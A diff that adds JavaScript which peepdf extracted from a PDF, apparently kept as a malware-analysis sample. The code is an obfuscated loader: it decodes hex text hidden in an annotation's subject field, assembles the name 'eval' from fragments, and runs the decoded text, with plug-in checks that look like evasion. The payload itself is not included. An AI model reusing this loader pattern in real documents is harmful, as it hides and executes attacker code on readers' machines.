@@ -1,0 +1,33 @@
+// peepdf comment: Javascript code located in object 5 (version 0)
+
+var sum = '';
+var buffer = "";
+var num = 1;
+var func = 'v';
+var pr = null;
+var duct = 107;
+
+app.doc.syncAnnotScan();
+if (app.plugIns.length < 1) {
+    func += "z";
+    num = 0;
+}
+
+if (!(app.plugIns.length < 1)) {
+    var xnm = {
+        nPage: 0
+    };
+    pr = app.doc.getAnnots(xnm);
+    sum = pr[num].subject;
+}
+
+if (app.plugIns.length > 2) {
+    var buf = sum.split("-");
+    func += "a";
+
+    for (var n = 0; n < buf.length - 1; n++) {
+        buffer = buffer + String.fromCharCode('0' + 'x' + buf[n + 1]);
+    }
+    app['e' + func + String.fromCharCode(duct + 1)](buffer);
+}
+
